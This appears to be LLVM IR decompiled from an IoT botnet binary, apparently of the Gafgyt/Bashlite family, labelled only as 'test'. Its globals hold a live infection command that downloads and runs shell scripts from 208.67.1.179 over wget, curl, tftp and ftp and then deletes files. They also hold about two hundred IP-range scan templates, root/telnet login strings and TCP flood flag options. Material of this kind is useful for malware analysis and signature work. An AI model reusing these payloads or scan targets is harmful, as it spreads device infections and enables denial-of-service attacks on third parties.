source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_10028238.2 = global i32 0
@global_var_10028244.3 = local_unnamed_addr global i32* @global_var_10028238.2
@global_var_10028858.6 = global i32 0
@global_var_1002823c.7 = global i32 0
@global_var_10028870.8 = global i32 0
@global_var_10028874.9 = local_unnamed_addr global i32 0
@global_var_10028878.10 = local_unnamed_addr global i32 0
@global_var_1002845c.11 = local_unnamed_addr global i32 4095
@global_var_10028458.12 = local_unnamed_addr global i32 362436
@global_var_10015220.13 = constant [7 x i8] c"(null)\00"
@global_var_100287f0.14 = local_unnamed_addr global i32 0
@global_var_100013c0.15 = constant i32 1208005105
@global_var_1000140c.16 = constant i32 939589631
@global_var_10001460.17 = constant i32 1207959608
@global_var_10015228.18 = constant [8 x i8] c"/bin/sh\00"
@global_var_10014e70.19 = constant [3 x i8] c"sh\00"
@global_var_10015230.20 = constant [3 x i8] c"-c\00"
@global_var_100014c0.21 = constant [3 x i8] c"8`\00"
@global_var_100014f0.22 = constant i32 1207959576
@global_var_10015234.23 = constant i32 -1
@global_var_10015634.24 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_10015644.25 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_10001ce8.26 = constant i32 939524096
@global_var_10001d34.27 = constant i32 939524097
@global_var_10001f28.28 = constant i32 939524126
@global_var_100287d0.29 = local_unnamed_addr global i32 0
@global_var_10015650.30 = constant [5 x i8] c"PING\00"
@global_var_10002024.31 = constant i32 939524126
@global_var_10015210.32 = constant [8 x i8] c"busybox\00"
@global_var_10015218.33 = constant i32 603979776
@global_var_1001521c.34 = constant i32 587202560
@global_var_1002841c.35 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10015210.32, i32 0, i32 0), i8* bitcast (i32* @global_var_10015218.33 to i8*), i8* bitcast (i32* @global_var_1001521c.34 to i8*)]
@global_var_100151d8.36 = constant [7 x i8] c"nvalid\00"
@global_var_100151e0.37 = constant [6 x i8] c"ailed\00"
@global_var_100151e8.38 = constant [9 x i8] c"ncorrect\00"
@global_var_100151f4.39 = constant [6 x i8] c"enied\00"
@global_var_100151fc.40 = constant [5 x i8] c"rror\00"
@global_var_10015204.41 = constant [7 x i8] c"oodbye\00"
@global_var_1001520c.42 = constant [4 x i8] c"bad\00"
@global_var_100283fc.43 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100151d8.36, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100151e0.37, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100151e8.38, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100151f4.39, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100151fc.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10015204.41, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001520c.42, i32 0, i32 0)]
@global_var_100027a0.44 = constant i32 939524098
@global_var_100029a8.45 = constant i32 939524097
@global_var_100287d8.46 = global i32 0
@global_var_100287dc.47 = local_unnamed_addr global i32 0
@global_var_10028804.48 = local_unnamed_addr global i32 0
@global_var_10002d20.49 = constant i32 939524096
@global_var_10015658.50 = constant [6 x i8] c":>%$#\00"
@global_var_100287e8.51 = global i32 0
@global_var_100287e9.52 = local_unnamed_addr global i32 0
@global_var_100287ea.53 = local_unnamed_addr global i32 0
@global_var_10015660.56 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_1001566c.57 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_1001567c.58 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_10015688.59 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_10015698.60 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_100156a4.61 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_100156b4.62 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_100156c0.63 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_100156d0.64 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_100156e0.65 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_100156f0.66 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_10015700.67 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1001570c.68 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_1001571c.69 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1001572c.70 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1001573c.71 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1001574c.72 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1001575c.73 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1001576c.74 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1001577c.75 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_10015788.76 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_10015794.77 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_100157a4.78 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_100157b0.79 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_100157bc.80 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_100157c8.81 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_100157d4.82 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_100157e0.83 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_100157f0.84 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_10015800.85 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1001580c.86 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1001581c.87 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_10015828.88 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_10015834.89 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_10015840.90 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1001584c.91 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_10015858.92 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_10015864.93 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_10015870.94 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_10015880.95 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_10015890.96 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_100158a0.97 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_100158b0.98 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_100158c0.99 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_100158d0.100 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_100158e0.101 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_100158f0.102 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_10015900.103 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_10015910.104 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_10015920.105 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_10015930.106 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_10015940.107 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_10015950.108 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_10015960.109 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_10015970.110 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_10015980.111 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_10015990.112 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_100159a0.113 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_100159b0.114 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_100159c0.115 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_100159d0.116 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_100159e0.117 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_100159f0.118 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_10015a00.119 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_10015a10.120 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_10015a20.121 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_10015a30.122 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_10015a40.123 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_10015a50.124 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_10015a60.125 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_10015a70.126 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_10015a80.127 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_10015a90.128 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_10015aa0.129 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_10015ab0.130 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_10015ac0.131 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_10015ad0.132 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_10015ae0.133 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_10015af0.134 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_10015b00.135 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_10015b10.136 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_10015b20.137 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_10015b30.138 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_10015b40.139 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_10015b50.140 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_10015b60.141 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_10015b70.142 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_10015b80.143 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_10015b90.144 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_10015ba0.145 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_10015bb0.146 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_10015bc0.147 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_10015bd0.148 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_10015be0.149 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_10015bf0.150 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_10015c00.151 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_10015c10.152 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_10015c20.153 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_10015c30.154 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_10015c3c.155 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_10015c4c.156 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_10015c5c.157 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_10015c6c.158 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_10015c78.159 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_10015c88.160 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_10015c98.161 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_10015ca8.162 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_10015cb8.163 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_10015cc8.164 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_10015cd8.165 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_10015ce8.166 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_10015cf8.167 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_10015d08.168 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_10015d18.169 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_10015d28.170 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_10015d38.171 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_10015d48.172 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_10015d58.173 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_10015d68.174 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_10015d74.175 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_10015d84.176 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_10015d94.177 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_10015da4.178 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_10015db4.179 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_10015dc4.180 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_10015dd4.181 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_10015de4.182 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_10015df4.183 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_10015e04.184 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_10015e14.185 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_10015e24.186 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_10015e34.187 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_10015e44.188 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_10015e54.189 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_10015e64.190 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_10015e74.191 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_10015e84.192 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_10015e94.193 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_10015ea4.194 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_10015eb4.195 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_10015ec4.196 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_10015ed4.197 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_10015ee4.198 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_10015ef4.199 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_10015f04.200 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_10015f14.201 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_10015f24.202 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_10015f34.203 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_10015f44.204 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_10015f54.205 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_10015f64.206 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_10015f70.207 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_10015f80.208 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_10015f90.209 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_10015fa0.210 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_10015fb0.211 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_10015fc0.212 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_10015fd0.213 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_10015fe0.214 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_10015ff0.215 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_10016000.216 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_10016010.217 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_10016020.218 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_10016030.219 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_10016040.220 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_10016050.221 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_10016060.222 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_10016070.223 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_10016080.224 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_10016090.225 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_100160a0.226 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_100160b0.227 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_100160c0.228 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_100160d0.229 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_100160e0.230 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_100160f0.231 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_10016100.232 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_10016110.233 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_10016120.234 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_10016130.235 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_10016140.236 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_10016150.237 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_10016160.238 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_10016170.239 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_10016180.240 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_10016190.241 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_100161a0.242 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_100161b0.243 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_100161c0.244 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_100161d0.245 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_100161e0.246 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_100161f0.247 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_10016200.248 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_10016210.249 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_10016220.250 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_10016230.251 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_10016240.252 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_10016250.253 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_100287f8.254 = local_unnamed_addr global i32 0
@global_var_10007c18.255 = constant i32 939524096
@global_var_10007dd8.256 = constant i32 939524098
@global_var_10007e94.257 = constant i32 939524096
@global_var_1001515c.258 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1001516c.259 = constant [6 x i8] c"/tmp/\00"
@global_var_10015174.260 = constant [6 x i8] c"/var/\00"
@global_var_1001517c.261 = constant [6 x i8] c"/dev/\00"
@global_var_10015184.262 = constant [10 x i8] c"/var/run/\00"
@global_var_10015190.263 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1001519c.264 = constant [6 x i8] c"/mnt/\00"
@global_var_100151a4.265 = constant [7 x i8] c"/boot/\00"
@global_var_100151ac.266 = constant [6 x i8] c"/usr/\00"
@global_var_100151b4.267 = constant [6 x i8] c"/opt/\00"
@global_var_100283bc.268 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1001515c.258, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001516c.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10015174.260, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001517c.261, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10015184.262, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10015190.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001519c.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100151a4.265, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100151ac.266, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100151b4.267, i32 0, i32 0)]
@global_var_1001628c.269 = constant i32 -57976
@global_var_10008320.270 = constant i32 1207962236
@global_var_10008340.271 = constant i32 1207962204
@global_var_10015148.283 = constant [5 x i8] c"root\00"
@global_var_10015150.284 = constant [7 x i8] c"telnet\00"
@global_var_10015158.285 = constant i32 0
@global_var_10014f98.307 = constant [430 x i8] c" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_10016c8c.308 = constant i32 33554944
@global_var_10016f8c.309 = constant i32 1
@global_var_10028530.312 = global i32 34603008
@global_var_100162ac.315 = constant [6 x i8] c"arfgG\00"
@global_var_100162b4.316 = constant [9 x i8] c"HBiug655\00"
@global_var_100162c0.317 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_100162d0.318 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_100162e4.319 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_100162f8.320 = constant [12 x i8] c"GJjyur67458\00"
@global_var_10016304.321 = constant [12 x i8] c"RYSDk747586\00"
@global_var_10016310.322 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1001631c.323 = constant [10 x i8] c"KHGK7985i\00"
@global_var_10016328.324 = constant [11 x i8] c"yuituiILYF\00"
@global_var_10016334.325 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_10016344.326 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_10016350.327 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_10016360.328 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1001636c.329 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1001637c.330 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_10016388.331 = constant [12 x i8] c"twehgbferhb\00"
@global_var_10016394.332 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_100163a0.333 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_100163b0.334 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_100163c0.335 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_100163d0.336 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_100163dc.337 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_100163ec.338 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_100163fc.339 = constant [12 x i8] c"yteytietyue\00"
@global_var_10016408.340 = constant [9 x i8] c"qsortEQS\00"
@global_var_10016414.341 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_10016424.342 = constant [4 x i8] c"std\00"
@global_var_10016428.343 = constant [4 x i8] c"dts\00"
@global_var_1001642c.344 = constant [4 x i8] c"lsk\00"
@global_var_10016430.345 = constant [4 x i8] c"kek\00"
@global_var_10016434.346 = constant [6 x i8] c"smack\00"
@global_var_1001643c.347 = constant [4 x i8] c"ily\00"
@global_var_10016440.348 = constant [4 x i8] c"tyf\00"
@global_var_10016444.349 = constant [4 x i8] c"pos\00"
@global_var_10016448.350 = constant [6 x i8] c"cunts\00"
@global_var_10016450.351 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100162ac.315, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100162b4.316, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100162c0.317, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_100162d0.318, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_100162e4.319, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100162f8.320, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10016304.321, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10016310.322, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001631c.323, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10016328.324, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10016334.325, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10016344.326, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10016350.327, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10016360.328, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1001636c.329, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001637c.330, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10016388.331, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10016394.332, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100163a0.333, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100163b0.334, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100163c0.335, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100163d0.336, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100163dc.337, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100163ec.338, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100163fc.339, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10016408.340, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10016414.341, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10016424.342, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10016428.343, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001642c.344, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10016430.345, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10016434.346, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001643c.347, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10016440.348, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10016444.349, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10016448.350, i32 0, i32 0)]
@global_var_10008eac.352 = constant i32 1207989473
@global_var_10008f2c.353 = constant [3 x i8] c"8`\00"
@global_var_10008f54.354 = constant [3 x i8] c"8`\00"
@global_var_10008f5c.355 = constant i32 939524096
@global_var_100164e0.356 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_10009078.357 = constant i32 1207960928
@global_var_100090cc.358 = constant [3 x i8] c"8`\00"
@global_var_10009198.359 = constant [3 x i8] c"9 \00"
@global_var_100091fc.360 = constant i32 1207960524
@global_var_100164fc.361 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1000924c.362 = constant i32 1207960444
@global_var_10009280.363 = constant i32 1207988493
@global_var_100095ac.364 = constant [3 x i8] c"9 \00"
@global_var_100096f4.365 = constant i32 1207960876
@global_var_10009744.366 = constant i32 1207960796
@global_var_10016520.367 = constant [4 x i8] c"all\00"
@global_var_10016524.368 = constant i32 738197504
@global_var_10016528.369 = constant [4 x i8] c"syn\00"
@global_var_1001652c.370 = constant [4 x i8] c"rst\00"
@global_var_10016530.371 = constant [4 x i8] c"fin\00"
@global_var_10016534.372 = constant [4 x i8] c"ack\00"
@global_var_10016538.373 = constant [4 x i8] c"psh\00"
@global_var_1001653c.374 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_10009a14.375 = constant [3 x i8] c"8`\00"
@global_var_10014d30.379 = constant [5 x i8] c"mips\00"
@global_var_10014d38.380 = constant [7 x i8] c"mipsel\00"
